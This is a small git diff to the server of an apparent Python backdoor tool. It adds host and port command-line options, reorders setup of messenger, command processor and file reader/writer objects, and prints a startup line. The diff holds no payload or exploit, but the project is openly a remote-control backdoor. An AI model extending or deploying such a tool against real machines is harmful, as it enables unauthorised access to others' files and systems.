@@ -1,4 +1,5 @@
 # pyright: reportUnusedVariable=false
+from argparse import ArgumentParser, Namespace
 import socket
 
 from backdoor.command.converter import InputToCommandConverter
@@ -72,21 +73,33 @@ class Server:
         return sock
 
 
+def parse_args() -> Namespace:
+    parser = ArgumentParser()
+    parser.add_argument('-a', '--host', required=False, default='127.0.0.1')
+    parser.add_argument('-p', '--port', required=False, default=4567, type=int)
+    return parser.parse_args()
+
+
 def main() -> None:
+    args = parse_args()
+
     protocol = SocketProtocol()
     serializer = JsonSerializer()
-    messenger = SocketMessenger(protocol, serializer)
-    exchanger = ServerExchangeMapper(messenger)
     converter = InputToCommandConverter()
     file_writer = FileWriter()
     file_reader = FileReader()
+
+    messenger = SocketMessenger(protocol, serializer)
+    exchanger = ServerExchangeMapper(messenger)
     processor = CommandProcessor(file_writer, file_reader)
-    server = Server(messenger, exchanger, converter, processor)
+
+    server = Server(messenger, exchanger, converter, processor, host=args.host, port=args.port)
 
     try:
+        print(f'Server running at {args.host}:{args.port}.')
         server.start()
     except KeyboardInterrupt:
-        ...
+        ...   
 
 
 if __name__ == "__main__":
